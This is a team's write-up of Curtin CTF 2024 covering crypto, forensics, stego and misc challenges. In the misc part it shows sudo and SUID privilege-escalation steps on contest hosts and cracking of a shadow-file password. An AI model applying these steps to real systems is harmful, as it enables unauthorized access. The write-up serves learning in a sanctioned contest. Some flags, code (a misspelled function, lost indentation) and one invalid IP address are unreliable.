@@ -1,0 +1,1489 @@
+# Curtin CTF 2024
+
+<figure><img src="../.gitbook/assets/image.png" alt="" width="563"><figcaption></figcaption></figure>
+
+**Team:** Flag/junkie
+
+* worstctfplayer (zeqzoq)
+* Ajiqqos
+* SpicyMochi (sleepy panda)
+
+***
+
+## WarmUp
+
+***
+
+### RE warmup
+
+**Description:**\
+Name the register that manages the current stack in 64-bit architectures called the stack pointer?
+
+**Flag:** CURTIN\_CTF{RSP}
+
+***
+
+### Extentions
+
+**Description:**\
+Here is a basic challenge to learn the basics of digital forensics. Find the hidden flag.
+
+**Flag:** CURTIN\_CTF{FLAG-EXTR4CTED\_MiSS1ON\_ACC0MLISHED}
+
+Got password and zip password protected file. Read the content of the password and use it to unlock the zipfile
+
+```bash
+$ cat password
+safepassword
+$ unzip flag.zip
+$ cat flag
+Q1VSVElOX0NURntGTEFHX0VYVFI0Q1RFRF0NaVNTMU9OX0FDQzBNUExJU0hFRU0=
+$ echo "Q1VSVElOX0NURntGTEFHX0VYVFI0Q1RFRF0NaVNTMU9OX0FDQzBNUExJU0hFRU0=" | base64 -d
+CURTIN_CTF{FLAG-EXTR4CTED_MiSS1ON_ACC0MLISHED}
+```
+
+***
+
+### Misc 1
+
+**Description:**\
+SSH as `ubuntu` and find the flag `18.142.44.244`
+
+**Flag:** CURTIN\_CTF{H1dd3n\_f1l3}
+
+Change the permission for the private key file to 600. We set private ssh keys to 600 so only the user who owns them can read them. If not the key will become unusable.
+
+```bash
+$ chmod 600 ./misc_1
+$ ssh -i ./misc_1 ubuntu@18.142.44.244 -v
+```
+
+Using basic linux to navigate through the ssh and search for flag.
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### Warmup-pwn
+
+**Description:**\
+Get to the win function to read the flag. The admin will share the flag with you
+
+**Flag:** CURTIN\_CTF{Cyb3rW4rri0rPr0t3ctTh3N3tw0rk}
+
+Here I used gdb to list the disassemble for the main. Search for win() and copy the address. Put the address to the input prompt when running the file.
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### Trivial 1
+
+**Description:**\
+With a primer, ignite the light. Illuminate paths hidden **from sight**
+
+**Flag:** CURTIN\_CTF{h4v3\_y0us33n\_op71mu5\_pr1m3}
+
+1. Brute force using all primes and 1 to 100.
+2. Find the correct flag.
+
+```python
+def decrypt(encrypted_values, primes, key):
+    decrypted_flag = ""
+
+    for encrypted_val in encrypted_values:
+        decrypted_char = encrypted_val
+
+        for prime in reversed(primes):  # Reverse to undo the encryption
+            decrypted_char = decrypted_char ^ key  # XOR to reverse the encryption
+            decrypted_char = decrypted_char // prime  # Undo the multiplication
+
+        # Convert the decrypted ASCII value to a character
+        decrypted_flag += chr(decrypted_char)
+
+    return decrypted_flag
+
+
+# Given encrypted flag and primes
+encrypted = [
+    594210592671903223984670632285650038564805292576759304030567768941732090171624826090878166285636274764932736516132,
+    9782102256911581663593927728229371984020525968926396146037520923635742496332172475457990676736787299620720321647151,
+    024053702609710508 ...
+]
+
+primes = [
+    762753748873595947897746019956536225138723924253002081166156597132862575903519447432353535160961397679225119554347,
+    7928821605804498759626725447745019911223,
+    7630901919735971485107874022535885400118024201377113255467307582298154844614252650526624455816640914255475613512793,
+    309028057627582647075919408894479312597,
+    9292867758193943774009686435866716211049467843773708273742385118963781425136723196802442961712715440041175728902151,
+    348400890352831854127682446924981829751,
+    12088786452523129715080041448548059948503851995099993438391085104663531562323539561705293163598347937919690971397638,
+    5682440622785127910634313734938971232253,
+    1069770744134110520388435758055727646592859579718385371154871200903293528792247699929337277895868206964814438658387,
+    9514055739426604667390640798130006415264109693835449770569252227926038953229112542434022408433145025523574487578651,
+    362284082898513297492061582443297976061,
+    1332651195691078059494902004251147846249521360094681857443982730289573571702792833986477050685191162755841046346139,
+    6680842587817251561044145599177810077297
+]
+
+# Brute-force all possible keys (from 1 to 100)
+for key in range(1, 101):
+    try:
+        decrypted_flag = decrypt(encrypted, primes, key)
+        print(f"Key: {key}, Decrypted flag: {decrypted_flag}")
+    except Exception as e:
+        continue  # If there's an error in decryption, skip to the next key
+```
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## Crypto
+
+***
+
+### Trivial 2
+
+**Description:**\
+Do I need to solve a high-school math problem again?
+
+**Flag:** CURTIN\_CTF{b4ck\_70\_r007s}
+
+1. The challenge encrypts a string using a simple polynomial-based transformation.
+2. From the formula of the encryption file, we can apply the reverse transformation to get the flag.
+
+challenge.py:
+
+```python
+"""
+Trivial 2
+@author: ROxR10
+"""
+
+import numpy as np
+
+def str_to_num_list(s):
+    return [ord(c) for c in s]
+
+def num_list_to_str(L):
+    return ''.join([chr(n) for n in L])
+
+def e_p(plain_text, coefficients):
+    num_list = str_to_num_list(plain_text)
+    encrypted_list = []
+
+    for num in num_list:
+        encrypted_value = sum(coefficients[i] * (num ** i) for i in range(len(coefficients)))
+        encrypted_list.append(encrypted_value)
+
+    return encrypted_list
+
+def main():
+    flag = "REDACTED"
+    coefficients = [1, 0, 1]
+
+    encrypted_list = e_p(flag, coefficients)
+
+    print("Encrypted list:", encrypted_list)
+
+if __name__ == "__main__":
+    main()
+```
+
+```python
+import math
+
+# Encrypted list from the challenge
+encrypted_list = [
+    4490, 7226, 6725, 7057, 5330, 6085, 9026, 4490, 7057, 4901,
+    15130, 9605, 2705, 9802, 11450, 9026, 3026, 2305, 9026,
+    12997, 2305, 2305, 3026, 13226, 15626
+]
+
+def decrypt(encrypted_list):
+    decrypted_chars = []
+
+    for encrypted_value in encrypted_list:
+        # Subtract 1 from the encrypted value
+        adjusted_value = encrypted_value - 1
+
+        # Take the square root to find the original ASCII value
+        ascii_value = int(math.sqrt(adjusted_value))
+
+        # Convert the ASCII value to the corresponding character
+        decrypted_chars.append(chr(ascii_value))
+
+    # Join the decrypted characters to form the final string (flag)
+    return ''.join(decrypted_chars)
+
+if __name__ == "__main__":
+    decrypted_flag = decrypt(encrypted_list)
+    print(f"Decrypted flag: {decrypted_flag}")
+```
+
+***
+
+### Bluff
+
+**Description:**\
+No key, no flag. Get it?
+
+**Flag:** CURTIN\_CTF{op3n\_s3s4m3\_7876598112}
+
+This xor does not give keys, so I used the the flag format as a guild.
+
+```python
+def decrypt(enc_list, key):
+    decrypted_chars = []
+    key_len = len(key)
+
+    for i, enc_val in enumerate(enc_list):
+        chunk = i // key_len
+        offset = i % key_len
+
+        # Reverse the XOR operation and the chunk addition
+        decrypted_char = (enc_val ^ key[offset]) - chunk
+        decrypted_chars.append(chr(decrypted_char))
+
+    return ''.join(decrypted_chars)
+
+
+# The encrypted values from the challenge
+enc_list = [
+    66, 188, 199, 131, 75, 166, 245, 147, 87, 161, 232, 166,
+    114, 223, 228, 181, 118, 222, 226, 239, 115, 209, 241,
+    235, 63, 212, 169, 236, 65, 214, 173, 239, 59, 108
+]
+
+# The deduced key
+key = [1, 233, 149, 215]
+
+# Decrypt the message
+decrypted_flag = decrypt(enc_list, key)
+print("Decrypted flag:", decrypted_flag)
+```
+
+***
+
+### RSA 1
+
+**Description:**\
+Sohan, the infamous crook, was finally caught and thrown into prison. There, he unexpectedly encounters Officer Kartik, who turns out to be his childhood friend.\
+Kartik hands him a puzzle and says, "If you solve this, I promise I'll let you out.\
+Help Sohan in his bid for freedom.
+
+**Flag:** CURTIN\_CTF{1s\_7h15\_50m37h1ng\_c10s3\_70\_m4g1c?}
+
+Used chatGPT for this.
+
+```python
+import math
+
+def find_primes(n, d):
+    # Calculate q using the quadratic formula
+    discriminant = d**2 + 4 * n
+    if discriminant < 0:
+        return None, None  # No real roots
+
+    sqrt_disc = math.isqrt(discriminant)
+
+    # Check if the discriminant is a perfect square
+    if sqrt_disc * sqrt_disc != discriminant:
+        return None, None  # Not a perfect square, no integer solutions
+
+    # Calculate possible values for q
+    q1 = (-d + sqrt_disc) // 2
+    q2 = (-d - sqrt_disc) // 2
+
+    # Calculate corresponding p values
+    p1 = q1 + d
+    p2 = q2 + d
+
+    return (p1, q1), (p2, q2)
+
+# Input values
+n = int(input("Enter n (modulus): "))
+d = int(input("Enter |p - q|: "))
+
+# Find the prime factors
+(prime1, prime2), (prime3, prime4) = find_primes(n, d)
+
+if prime1 and prime2:
+    print(f"Possible primes are p: {prime1}, q: {prime2}")
+else:
+    print("No valid prime pairs found.")
+
+if prime3 and prime4:
+    print(f"Possible primes are p: {prime3}, q: {prime4}")
+else:
+    print("No valid prime pairs found.")
+```
+
+```bash
+$ Enter n (modulus):
+1594088039308162219222397954641766845424 #fill all the input
+```
+
+```python
+def decimal_to_utf8(decimal_number):
+    # Convert decimal number to bytes using to_bytes method
+    byte_representation = decimal_number.to_bytes((decimal_number.bit_length() + 7) // 8, 'big')
+
+    # Decode bytes using UTF-8
+    utf8_string = byte_representation.decode('utf-8')
+
+    return utf8_string
+
+# Example
+original_decimal = 617715206715350827566805481320272314940016426736675843232202439786681438840440635475182629359482051519266685
+print("Original Decimal:", original_decimal)
+
+# Convert decimal to UTF-8 string
+utf8_result = decimal_to_utf8(original_decimal)
+print("Decimal to UTF-8 String:", utf8_result)
+```
+
+```bash
+$ Original Decimal: 617715206715350827566805481320272314940016426736675843232202439786681438840440635475182629359482051519266685
+Decimal to UTF-8 String: CURTIN_CTF{1s_7h15_50m37h1ng_c10s3_70_m4g1c?}
+```
+
+***
+
+### Amalgam
+
+**Description:**\
+Rigid, yet brittle...\
+NOTE: Enclose the flag within CURTIN\_CTF{}
+
+**Flag:** CURTIN\_CTF{dlP\_50lv3d:)}
+
+1. Calculate the private key x by solving the discrete logarithm: h=gxmod  ph=gxmodp.
+2. Compute the shared secret s as s=c1xmod  ps=c1xmodp.
+3. Find the modular inverse of s, denoted as s\_inv.
+4. Decrypt the message by computing m=(c2×sinv)mod  pm=(c2×sinv)modp.
+5. Convert the decrypted integer m to a byte string and decode to retrieve the original message or flag.
+
+```python
+from sympy.ntheory import discrete_log
+from Crypto.Util.number import inverse, long_to_bytes
+
+# Given paramaters
+p = 186506814954895414068796533711441426871
+g = 2
+h = 128780011407215156870232600336696679553
+c1 = 156581689710555992734938659724336258165
+c2 = 113787733820173627914147318932861607685
+
+#step 1: Compute the private key x
+print("Computing the private key...")
+x = discretet_log(p, h, g)
+print(f"Private key x = {x}")
+
+#step 2: Compute the shared secret s
+s = pow(c1, x, p)
+
+#step 3: Compute the modular inverse of s
+s_inv = inverse(s, p)
+
+#step 4: Recover the plaintext message m
+m = (c2 * s_inv) % p
+
+#step 5: Convert m to bytes
+flag = long_to_bytes(m)
+
+print(f"Recovered Flag: {flag.decode()}")
+```
+
+```bash
+$ python3 factor.py
+Computing the private key x...
+Private key x = 63277427936816332851542320439881245850
+Recovered Flag: dlP_50lv3d:)
+```
+
+***
+
+### Dance of the Stream
+
+**Description:**\
+Row, row, row your boat, gently down the stream...
+
+**Flag:** CURTIN\_CTF{g0\_s0lv3\_7h3\_57r34m\_pr0bl3m\_0f\_1r0d0v\_n0w}
+
+1. Perform quarter-round transformations (q\_r) on state values using bitwise operations (addition, XOR, shifts) to update them.
+2. Initialize the stream cipher state with a key, nonce, and counter, then copy the state into a working state for transformations.
+3. Apply 20 rounds of quarter-round operations (2 per loop) on the working state using the q\_r function.
+4. After the rounds, combine the working state with the original state and pack the result into a byte stream.
+5. Use the stream\_e function to generate a keystream based on the key and nonce, then XOR the keystream with the message to encrypt or decrypt.
+6. The o\_value function XORs the input with the string b'leomessi' to obfuscate or de-obfuscate values like the nonce.
+7. The recover\_nonce function reads an obfuscated nonce from a file, uses o\_value to recover the original nonce, and converts it to an integer.
+8. The load\_ciphertext function reads the ciphertext from a file.
+9. In decrypt\_ciphertext, perform a brute-force search over 16-bit keys, generating keystreams for each key, XOR-ing with the ciphertext, and checking if the result is valid printable ASCII.
+10. If a valid decryption is found, the key and plaintext are returned; otherwise, the brute-force continues.
+11. In the main function, load the nonce and ciphertext, and attempt decryption by calling decrypt\_ciphertext.
+
+```python
+import struct
+from tqdm import tqdm
+
+def q_r(a, b, c, d):
+a = (a + b) & 0xFFFFFFFF
+d = (d ^ a) << 16 | (d ^ a) >> (32 - 16)
+c = (c + d) & 0xFFFFFFFF
+b = (b ^ c) << 12 | (b ^ c) >> (32 - 12)
+a = (a + b) & 0xFFFFFFFF
+d = (d ^ a) << 8 | (d ^ a) >> (32 - 8)
+c = (c + d) & 0xFFFFFFFF
+b = (b ^ c) << 7 | (b ^ c) >> (32 - 7)
+return a, b, c, d
+
+def stream(key, nonce, counter):
+state = [0] * 16
+state[0] = 0x61707865
+state[1] = 0x3320646e
+state[2] = 0x79622d32
+state[3] = 0x6b206574
+state[4:6] = struct.unpack("<2L", key + b'\x00' * 6)
+state[6:8] = [0] * 2
+state[8:12] = [0] * 4
+state[12] = counter
+state[13] = nonce & 0xFFFFFFFF
+state[14] = (nonce >> 32) & 0xFFFFFFFF
+state[15] = 0
+
+working_state = state[:]
+for _ in range(20 // 2):
+working_state[0], working_state[4], working_state[8], working_state[12] = q_r(
+working_state[0], working_state[4], working_state[8], working_state[12]
+)
+working_state[1], working_state[5], working_state[9], working_state[13] = q_r(
+working_state[1], working_state[5], working_state[9], working_state[13]
+)
+working_state[2], working_state[6], working_state[10], working_state[14] = q_r(
+working_state[2], working_state[6], working_state[10], working_state[14]
+)
+working_state[3], working_state[7], working_state[11], working_state[15] = q_r(
+working_state[3], working_state[7], working_state[11], working_state[15]
+)
+working_state[0], working_state[5], working_state[10], working_state[15] = q_r(
+working_state[0], working_state[5], working_state[10], working_state[15]
+)
+working_state[1], working_state[6], working_state[11], working_state[12] = q_r(
+working_state[1], working_state[6], working_state[11], working_state[12]
+)
+working_state[2], working_state[7], working_state[8], working_state[13] = q_r(
+working_state[2], working_state[7], working_state[8], working_state[13]
+)
+working_state[3], working_state[4], working_state[9], working_state[14] = q_r(
+working_state[3], working_state[4], working_state[9], working_state[14]
+)
+
+output = bytearray()
+for i in range(16):
+output.extend(struct.pack("<L", (working_state[i] + state[i]) & 0xFFFFFFFF))
+return output
+
+def stream_e(key, nonce, message):
+keystream = bytearray()
+for i in range(0, len(message), 64):
+keystream.extend(stream(key, nonce, i // 64))
+return bytes([m ^ k for m, k in zip(message, keystream)])
+
+def o_value(value):
+o_kie = b'leomessi'
+return bytes([b ^ o_kie[i % len(o_kie)] for i, b in enumerate(value)])
+
+def recover_nonce(o_nonce_path):
+with open(o_nonce_path, 'rb') as f:
+o_nonce = f.read()
+nonce_bytes = o_value(o_nonce)
+nonce = struct.unpack("<Q", nonce_bytes)[0]
+return nonce
+
+def load_ciphertext(ciphertext_path):
+with open(ciphertext_path, 'rb') as f:
+ciphertext = f.read()
+return ciphertext
+
+def decrypt_ciphertext(ciphertext, nonce):
+print("Starting brute-force key search...")
+for key_int in tqdm(range(0x0000, 0x10000)):
+key = key_int.to_bytes(2, byteorder='big')
+decrypted_message = stream_e(key, nonce, ciphertext)
+try:
+plaintext = decrypted_message.decode('utf-8')
+if all(32 <= ord(c) <= 126 for c in plaintext):  # Check for printable ASCII
+print(f"\nKey found: {key.hex()}")
+print(f"Decrypted message: {plaintext}")
+return key_int, plaintext
+except UnicodeDecodeError:
+continue
+print("No valid plaintext found with the keys tried.")
+return None, None
+
+def main():
+nonce = recover_nonce('o_nonce.txt')
+ciphertext = load_ciphertext('ciphertext.txt')
+key_int, plaintext = decrypt_ciphertext(ciphertext, nonce)
+if key_int is not None:
+print("\nSuccessful decryption:")
+print(f"Key: {key_int:04x}")
+print(f"Plaintext: {plaintext}")
+else:
+print("Decryption unsuccessful.")
+
+if __name__ == '__main__':
+main()
+
+```
+
+***
+
+### Feel the Heat
+
+**Description:**\
+My friend asks "When am I ever going to use partial diffentiation in my life?"
+
+**Flag:** CURTIN\_CTF{con57r41n3d\_0p71m1z4710n}
+
+**Approach:**\
+For the key:
+
+1. Decrypt decrypted\_key to get original\_key\_padded.
+2. Remove padding with unpad and print original\_key, handling errors with a try-except block to catch decryption or padding failures.
+
+For the flag:
+
+1. Set up the PDE function pde, used both during encryption and decryption.
+2. Define t\_backward, the time array for solving the PDE in reverse.
+3. Use odeint to solve the PDE backward in time, with the key as the diffusion coefficient, recovering the original message state.
+4. Extract the recovered message at time zero (original state) from the solution.
+
+Convert the numerical values back to characters by rounding them to the nearest ASCII values, then join them to form the original message.
+
+```python
+from Crypto.Cipher import DES
+from Crypto.Util.Padding import unpad
+
+# Reversed key from the bitwise operation
+decrypted_key = b'R\x16r\xf7\x9c?"\xbb\xa5j\x91\xa0l\x16\xe5\x8d\xb0\x06\xdeW\x19\xb7mx'
+
+# The key used for DES encryption
+k = b'XOXOXOXO'
+
+# Create a DES cipher object with ECB mode
+cipher = DES.new(k, DES.MODE_ECB)
+
+# Decrypt the reversed key
+original_key_padded = cipher.decrypt(decrypted_key)
+
+# Unpad the decrypted key to remove any padding that was added during encryption
+try:
+    original_key = unpad(original_key_padded, DES.block_size)
+    print("Original Key:", original_key)
+except ValueError:
+    print("Decryption failed or padding is incorrect.")
+
+```
+
+```bash
+$ python3 f.py
+Original Key: b'2.77987109890597'
+```
+
+Solving using PDE backwards in time.
+
+```python
+import numpy as np
+from scipy.integrate import odeint
+
+# Load the encrypted message from the .npy file
+encrypted_message = np.load('encrypted.npy')
+
+# The floating-point key that was decrypted earlier
+key = 2.77987109890597
+
+# Number of points used in the encryption
+num_points = len(encrypted_message)
+
+# Define the PDE function (same as used in encryption)
+def pde(u, t, D):
+    return D * np.gradient(np.gradient(u))
+
+# Time values used during encryption
+t_max = 1.0
+t_backward = np.linspace(t_max, 0, num_points)  # Time goes from t_max to 0 (backward in time)
+
+# Solve the PDE backwards in time to reverse the encryption
+recovered_solution = odeint(pde, encrypted_message, t_backward, args=(key,))
+
+# Extract the first time step, which should correspond to the initial message
+recovered_message = recovered_solution[-1]  # The last entry corresponds to time 0 (original state)
+
+# Convert the numerical array back to characters (rounding to nearest ASCII values)
+message_chars = [chr(int(round(c))) for c in recovered_message if 0 <= c < 128]
+
+# Join the characters to form the original message
+original_message = ''.join(message_chars)
+
+print("Recovered Message:", original_message)
+```
+
+```bash
+$ python3 e.py
+Recovered Message: CURTIN_CTF{con57r41n3d_0p71m1z4710n}
+```
+
+***
+
+### Tutto Bene
+
+**Description:**\
+Somebody call the fire brigade!
+
+**Flag:** CURTIN\_CTF{n07h1n9\_h4pp3n3d\_7h3\_cpu\_s33m5\_70\_b3\_f1n3}
+
+1. Generate all possible 2-character combinations of printable characters.
+2. Compute the SHA-512 hash for each pair and extract various substrings.
+3. Reverse these substrings and store them in a dictionary for quick lookup.
+4. Slide a window over the given hash h, extract substrings, reverse them, and check for matches in the dictionary.
+5. Collect all matching pairs and reconstruct the flag by sorting them based on their positions in h.
+
+```python
+import hashlib
+import string
+
+# The given h value (truncated for brevity in this example)
+h = "8b1de8b2e359021a600fa563b32b3b15ab00d1b0855ad49c ... "
+
+# Build the dictionary of possible hash substrings
+printable_chars = ''.join([chr(c) for c in range(32, 127)])
+pairs = [a + b for a in printable_chars for b in printable_chars]
+
+s_rev_candidate_dict = {}
+for pair in pairs:
+    hash_value = hashlib.sha512(pair.encode('utf-8')).hexdigest()
+    for a in range(1, 17):
+        for b in range(1, 17):
+            k = a + b
+            if 2 <= k <= 32:
+                L = 128 - k
+                s_rev_candidate = hash_value[a:-b]
+                s_rev_candidate_dict[s_rev_candidate] = pair
+
+# Extract substrings from h and attempt to find matches
+flag_pairs = []
+for i in range(len(h) - 96):
+    for L in range(96, 127):
+        if i + L <= len(h):
+            s = h[i:i + L]
+            s_rev = s[::-1]
+            if s_rev in s_rev_candidate_dict:
+                pair = s_rev_candidate_dict[s_rev]
+                flag_pairs.append((i, pair))
+
+# Sort pairs based on their position and reconstruct the flag
+flag_pairs = sorted(set(flag_pairs), key=lambda x: x[0])
+flag = ''.join([pair for _, pair in flag_pairs])
+
+print("Recovered flag:", flag)
+```
+
+The output was not 100% accurate, so I manually adjusted to get the correct flag.
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## Forensic and Stego
+
+***
+
+### Transparency
+
+**Description:**\
+In the light of truth, nothing is truly hidden, yet the clearest of things often remain unseen. Transparency isn't just about visibility; it's about revealing what lies beneath, in the layers we choose not to notice. Can you uncover what’s been laid bare, but only to those who know where to look?\
+md5sum: `a052a59bcb6ccb5c6949e9ec0eb2d595`\
+sha1sum: `6b619b8e87da3f61a0aa98e3e9d5666963ab4af9`
+
+**Flag:** CURTIN\_CTF{imagine\_not\_using\_steghide}
+
+Used zsteg -a filename and found the plane that suspicious. Then carve out the plane text using zsteg.
+
+```bash
+$ zsteg -E b8,a,lsb,xy stego.png
+```
+
+***
+
+### Inziption
+
+**Description:**\
+Defense in Depth is the foundation for robust security, layering protection to deter even the most persistent threats. But what happens when there’s a leak in the armor? Can the sheer depth of protection save the day?\
+md5sum: `c19da4010ecc2f0f734fca5f5c021ec0`\
+sha1sum: `a5a3b3a31b7a5b7ecc77dd588daef9594826c42d`
+
+**Flag:** CURTIN\_CTF{1\_H0P3\_YOU\_AUT0M4TED\_TH1S\_Z1P\_B0MB}
+
+I could not do the script to open the zipfile. So I just open one by one :> There is password in the comment of each zip file. Use it to open the zip file inside of the current file.
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+The good side is I don’t fall into the rabbit hole. There is flag in the comment not in the flag txt after we done extracting.
+
+```bash
+$ 7z x file0.zip
+
+7-Zip [64] 20.07 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19
+ 64-bit locale=en_US.UTF-8 Threads:16 OPEN_MAX:1024
+
+Scanning the drive for archives:
+1 file, 249 bytes (1 KiB)
+
+Extracting archive: file0.zip
+--
+Path = file0.zip
+Type = zip
+Physical Size = 249
+Comment = CURTIN_CTF{I_H0P3_Y0U_AUT0M4TED_THIS_ZIP_BOMB}
+```
+
+***
+
+### Cracked PDF
+
+**Description:**\
+In this file lies a secret that’s been locked away, protected by a rock-solid password. But once you gain access, be careful not to let appearances deceive you. Can you see through the illusion and uncover the real message?\
+md5sum: `ed611d39b0c6c1b63df2ecd9ef40e533`\
+sha1sum: `1d3e1797ae53bdd8c53796ef3efe2c828a6e22ec`
+
+**Flag:** CURTIN\_CTF{UNDERST4NDING\_WH1TE\_SP4CES\_IS\_IMMP0RT4NT}
+
+1. Using pdf2john gets me the password ”PRETTY”
+2. Use pdf Xchange editor to select all the hidden content that is hidden under the page.
+3. Use python to automatically change \_ to 1 and . to 0.
+4. Use cyberchef to change into text.
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+The full content is very long
+
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+Can use Online decoder but we use python script.
+
+```python
+# Define the input string
+input_string = """
+.
+_.
+...
+__.
+_.
+_
+
+"""
+
+# Replace '.' with '0' and '-' with '1'
+output_string = input_string.replace('.', '0').replace('-', '1')
+
+# Remove any newlines or extra spaces for a single continuous string
+output_string = output_string.replace('\n', '').replace(' ', '')
+
+# Print the result
+print(output_string)
+```
+
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### iHeader
+
+**Description:**\
+I received this secret message from a friend, however it looks like someone has tampered with the structure of this image. What could this secret message be?\
+md5sum: `47a2c9c20500fe6227a8b27eff23becd`\
+sha1sum: `fcf9814ec18acfc9b7a98d944a7a4fc7a1d98b21`
+
+**Flag:** CURTIN\_CTF{m4gic\_byt3s\_are\_s0\_mag1cal}
+
+When opening the corrupted png file in the HxD, there is AAAA. Open [wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures) to see the real header. Change AAAA to IHDR.
+
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+But the image still corrupted. I use pngcheck and it say there si BBBB.
+
+```bash
+$ pngcheck header.png
+zlib warning: different version (expected 1.2.13, using 1.3.1)
+
+header.png  illegal (unless recently approved) unknown, public chunk BBBB
+ERROR: header.png
+```
+
+Search for it in HxD, used the wiki, change BBBB to IDAT since IDAT mainly in the middle of the hex.
+
+Then we got the flag.
+
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### CrazySignal
+
+**Description:**\
+Lost in transmission, a familiar code awaits discovery. But this one wasn't sent the usual way—it's hidden in a broadcast, distorted by a robotic signal. To recover the message, you'll need to tune in carefully and decode what's hidden in plain sight. Can you crack the transmission and reveal the secret?\
+md5sum: `c648727fd29947d220848ac6367e95a`\
+sha1sum: `95a13b689f1e2eb9c90df646d146eabd6bcb6755`
+
+**Flag:** CURTIN\_CTF{SP4C3\_EXPL0RERS\_MU5T\_KNOW\_AB0U7\_SSTV}
+
+The sound is very weird so I don’t recommend to use it as an alarm. I changed the mpeg file to wav. Then used SSTV to get image from the sound.
+
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+Then I scan with phone and got the flag.
+
+***
+
+## Misc
+
+***
+
+### Misc 2
+
+**Description:**\
+SSH as `curtin` and enter the flag\
+`18.142.44.244`
+
+**Flag:** CURTIN\_CTF{NO\_P@TH}
+
+Misc challenge series got many tampering with other players, so I hope all of this is intended solution.
+
+Just basic ls
+
+```bash
+$ ssh -i ./misc_2 curtin@18.142.44.244
+Last login: Sat Oct 12 06:57:41 2024 from 60.54.227.10
+curtin@ip-172-31-19-125:~$ ls
+1.php  flag
+curtin@ip-172-31-19-125:~$ cat flag
+CURTIN_CTF{NO_P@TH}
+```
+
+***
+
+### Misc 3
+
+**Description:**\
+SSH as `curtin2` and enter the flag\
+`18.142.44.244`
+
+**Flag:** CURTIN\_CTF{Esc@pe\_C0d35}
+
+Here I research more about the escape sequence. Tried the sed but failed but just use xxd.
+
+```bash
+curtin@ip-172-31-19-125:~$ ls
+1.php  flag
+curtin@ip-172-31-19-125:~$ file flag
+flag: ASCII text, with escape sequences
+curtin@ip-172-31-19-125:~$ cat flag | sed 's/\x1b\[[0-9;]*m//g'
+Hope_you_are_enjoying_the_ctf}
+curtin@ip-172-31-19-125:~$ xxd flag
+00000000: 4666 6167 3a20 4355 5254 494e 5f43 5446  Flag: CURTIN_CTF
+00000010: 7b45 7363 4070 655f 4330 6433 357d 200a  {Esc@pe_C0d35} ..
+00000020: 1b5b 4d48 6f70 655f 796f 755f 6172 655f  .[AHope_you_are_
+00000030: 656e 6a6f 7969 6e67 5f74 6865 5f63 7466  enjoying_the_ctf
+00000040: 0a                                       .
+```
+
+***
+
+### Misc 4
+
+**Description:**\
+SSH as `curtin3` and enter the flag\
+`18.142.44.244`
+
+**Flag:** CURTIN\_CTF{d@$h3d\_f0lder}
+
+The – is a directory but we couldn’t cd – just like that. So need to cd to tell the computer that it is a directory
+
+```bash
+$ ssh -i ./misc_4 curtin3@18.142.44.244
+Last login: Sat Oct 12 18:47:07 2024 from 60.52.218.19
+curtin3@ip-172-31-19-125:~$ cd /home/curtin3
+curtin3@ip-172-31-19-125:/home/curtin3$ ls
+- bin  flag.txt  pspy64
+curtin3@ip-172-31-19-125:/home/curtin3$ cd -
+/home/curtin3
+curtin3@ip-172-31-19-125:/home/curtin3$ cd /home/curtin3/-/
+curtin3@ip-172-31-19-125:~/~$ ls
+flag
+curtin3@ip-172-31-19-125:~/~$ cat flag
+CURTIN_CTF{d@sh3d_f0lder}
+```
+
+***
+
+### Misc 5
+
+**Description:**\
+SSH as `ubuntu` and enter the flag\
+`54.255.1.14`
+
+**Flag:** CURTIN\_CTF{$ud0\_N0\_P@s$wd}
+
+When we were doing privilege excaltion challenge, we use sudo -l to check the command that we can use without knowing the password for root. Here we can use /bin/more. /bin/more is similar to cat.
+
+```bash
+$ ssh -i ./misc_5 ubuntu@54.255.1.14
+Last login: Sat Oct 12 21:47:05 2024 from 27.125.245.18
+ubuntu@ip-172-31-46-50:~$ sudo -l
+Matching Defaults entries for ubuntu on ip-172-31-46-50:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User ubuntu may run the following commands on ip-172-31-46-50:
+    (root) NOPASSWD: /bin/more
+ubuntu@ip-172-31-46-50:~/~$ ls
+es       flag1        john_hashes.txt    john_shadow.txt   new_key  
+flag     john_hash.txt  john_key         key.txt          new_key.pub  
+sad      snap          unshadowed_password  wtf
+ubuntu@ip-172-31-46-50:~/~$ sudo /bin/more flag
+CURTIN_CTF{$ud0_N0_P@s$wd}
+```
+
+***
+
+### Misc 7
+
+**Description:**\
+`nc 52.221.246.50 1337` - get bash shell\
+enter the flag\
+`554.254.174.55`
+
+**Flag:** CURTIN\_CTF{$3tU1D}
+
+Use get privilege escalation bash cheat cheet. The command is run find / -type f -perm -4000 2>/dev/null Then do like misc 5 to get flag.
+
+```bash
+ubuntu@ip-172-31-46-50:~$ /etc/security/print_file flag
+CURTIN_CTF{$3tU1D}
+```
+
+***
+
+#### Password recovery 1
+
+**Description:**\
+Alex has forgotten his Linux login password, but has a copy of the computer's shadow.
+
+The organisation Alex works at has a 90-day password rotation policy and requires at least one lowercase, uppercase, special character, and a number. Help him recover his password.
+
+Flag format: CURTIN\_CTF{`Alex's_Password`}
+
+**Flag:** CURTIN\_CTF{Autumn2024!}
+
+Cat the shadow to see list of hashed passwords. I extract Alex’s hash to a txt file. Then search for wordlist that related to season.
+
+<figure><img src="../.gitbook/assets/image (13).png" alt="" width="375"><figcaption></figcaption></figure>
+
